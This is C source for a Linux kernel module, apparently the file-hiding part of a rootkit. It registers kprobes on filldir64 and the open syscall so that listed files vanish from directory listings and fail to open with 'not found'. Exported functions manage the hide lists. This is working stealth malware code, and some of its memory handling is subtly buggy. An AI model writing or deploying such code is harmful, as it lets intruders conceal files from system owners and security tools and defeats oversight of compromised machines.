#include "hidefs.h"
#include "init.h"

char func_open_name[NAME_MAX] = NAME_OPEN_SYSCALL;

struct kprobe kp_open_pre = { .symbol_name = NAME_OPEN_SYSCALL,
			      .pre_handler =
				      _hidefs_file_hide_open_handler_pre };

struct kretprobe kp_open = {
	.handler = _hidefs_file_hide_open_handler,
	.entry_handler = NULL,
	.data_size = 0,
	/* Probe up to 20 instances concurrently. */
	.maxactive = 20,
};

char current_open_arg[NAME_MAX];

struct kprobe kpf = { .symbol_name = "filldir64",
		      .pre_handler = _hidefs_file_hide_handler };

char **files_open_to_hide = NULL;

void hidefs_add_file_open(char *path, int pathlen)
{
	char **slot = files_open_to_hide;

	for (int i = 0; i < MAX_OPEN_HIDE; i++) {
		if (slot[i] == NULL) {
			slot[i] = kmalloc(pathlen + 1, GFP_KERNEL);
			if (!slot[i]) {
				return;
			}
			memset(slot[i], 0, pathlen + 1);
			memcpy(slot[i], path, pathlen);
			// dbg_print("%s a bien ete ajoute\n", slot[i]);
			return;
		}
	}
	return;
}

void hidefs_remove_file_open(char *path)
{
	for (size_t i = 0; i < MAX_OPEN_HIDE; i++) {
		if (files_open_to_hide[i]) {
			if (strcmp(files_open_to_hide[i], path) == 0) {
				memset(files_open_to_hide[i], 0,
				       strlen(files_open_to_hide[i]));
				kfree(files_open_to_hide[i]);
				files_open_to_hide[i] = NULL;
			}
		}
	}
}

int _hidefs_file_hide_open_handler(struct kretprobe_instance *ri,
				   struct pt_regs *regs)
{
	char *filename = (char *)regs->si;
	if (!filename) {
		return 0;
	}
	for (size_t i = 0; i < MAX_OPEN_HIDE; i++) {
		if (files_open_to_hide[i]) {
			if (strcmp(files_open_to_hide[i], current_open_arg) ==
			    0) {
				regs->ax = -ENOENT;
				return -ENOENT;
			}
		}
	}
	return 0;
}

int _hidefs_file_hide_open_handler_pre(struct kprobe *p, struct pt_regs *regs)
{
	char *filename = (char *)regs->si;
	if (!filename) {
		return -1;
	}
	memset(current_open_arg, 0, NAME_MAX);
	memcpy(current_open_arg, filename, strlen(filename));
	return 0;
}

char **files_to_hide = NULL;

void hidefs_add_file(char *path, int pathlen)
{
	char **slot = files_to_hide;

	for (int i = 0; i < MAX_PATHS_HIDE; i++) {
		if (slot[i] == NULL) {
			slot[i] = kmalloc(pathlen + 1, GFP_KERNEL);
			if (!slot[i]) {
				return;
			}
			memset(slot[i], 0, pathlen + 1);
			memcpy(slot[i], path, pathlen);
			return;
		}
	}
	return;
}

void hidefs_remove_file(char *path)
{
	for (size_t i = 0; i < MAX_PATHS_HIDE; i++) {
		if (files_to_hide[i]) {
			if (strcmp(files_to_hide[i], path) == 0) {
				memset(files_to_hide[i], 0,
				       strlen(files_to_hide[i]));
				kfree(files_to_hide[i]);
				files_to_hide[i] = NULL;
			}
		}
	}
}

int _hidefs_file_hide_handler(struct kprobe *p, struct pt_regs *regs)
{
	char *filename = (char *)regs->si;
	char **file;

	for (file = files_to_hide; *file != NULL; file++) {
		if (strcmp(filename, *file) == 0) {
			strcpy((char *)regs->si, "\x00");
		}
	}
	return 0;
}

int hidefs_init(void)
{
	int ret;

	files_to_hide =
		kmalloc_array(MAX_PATHS_HIDE, sizeof(char **), GFP_KERNEL);
	memset(files_to_hide, 0, sizeof(char **) * MAX_PATHS_HIDE);
	if (!files_to_hide) {
		return -ENOMEM;
	}

	files_open_to_hide =
		kmalloc_array(MAX_OPEN_HIDE, sizeof(char **), GFP_KERNEL);
	memset(files_open_to_hide, 0, sizeof(char **) * MAX_OPEN_HIDE);
	if (!files_open_to_hide) {
		return -ENOMEM;
	}

	ret = register_kprobe(&kpf);
	if (ret < 0) {
		return ret;
	}

	ret = register_kprobe(&kp_open_pre);
	if (ret < 0) {
		return ret;
	}

	kp_open.kp.symbol_name = func_open_name;
	ret = register_kretprobe(&kp_open);
	if (ret < 0) {
		return ret;
	}

	return 0;
}

void hidefs_exit(void)
{
	unregister_kprobe(&kpf);
	unregister_kprobe(&kp_open_pre);
	unregister_kretprobe(&kp_open);
}

EXPORT_SYMBOL(hidefs_init);
EXPORT_SYMBOL(hidefs_exit);

EXPORT_SYMBOL(hidefs_add_file_open);
EXPORT_SYMBOL(hidefs_remove_file_open);
EXPORT_SYMBOL(hidefs_add_file);
EXPORT_SYMBOL(hidefs_remove_file);
